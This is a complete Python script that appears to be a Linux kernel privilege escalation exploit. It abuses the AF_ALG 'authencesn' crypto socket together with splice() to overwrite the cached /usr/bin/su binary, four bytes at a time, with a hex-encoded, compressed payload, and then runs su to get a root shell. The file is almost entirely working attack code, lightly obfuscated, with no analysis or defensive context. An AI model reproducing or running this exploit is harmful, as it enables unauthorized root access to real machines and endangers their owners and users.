#!/usr/bin/env python3
import os as o, zlib, socket as s
from ctypes import CDLL, c_int, c_ulong, c_size_t, c_void_p, byref, c_longlong

libc = CDLL("libc.so.6")
def sp(fin, offin, fout, offout, len_, fl=0):
    p = lambda x: byref(c_longlong(x)) if x is not None else None
    return libc.splice(fin, p(offin), fout, p(offout), len_, fl)

def d(x): return bytes.fromhex(x)

def c(fd, off, chunk):
    a = s.socket(38, 5, 0)
    a.bind(("aead", "authencesn(hmac(sha256),cbc(aes))"))
    h = 279
    a.setsockopt(h, 1, d('0800010000000010'+'0'*64))
    a.setsockopt(h, 5, None, 4)
    u,_ = a.accept()
    l = off + 4
    i = d('00')
    u.sendmsg([b"A"*4 + chunk], [(h,3,i*4),(h,2,b'\x10'+i*19),(h,4,b'\x08'+i*3)], 32768)
    r,w = o.pipe()
    sp(fd, 0, w, None, l)
    sp(r, None, u.fileno(), None, l)
    try: u.recv(8+off)
    except: pass

fd = o.open("/usr/bin/su", 0)
data = zlib.decompress(d("78daab77f57163626464800126063b0610af82c101cc7760c0040e0c160c301d209a154d16999e07e5c1680601086578c0f0ff864c7e568f5e5b7e10f75b9675c44c7e56c3ff593611fcacfa499979fac5190c0c0c0032c310d3"))

i = 0
while i < len(data):
    c(fd, i, data[i:i+4])
    i += 4

print("[+] Done. Getting root...")
o.system("su")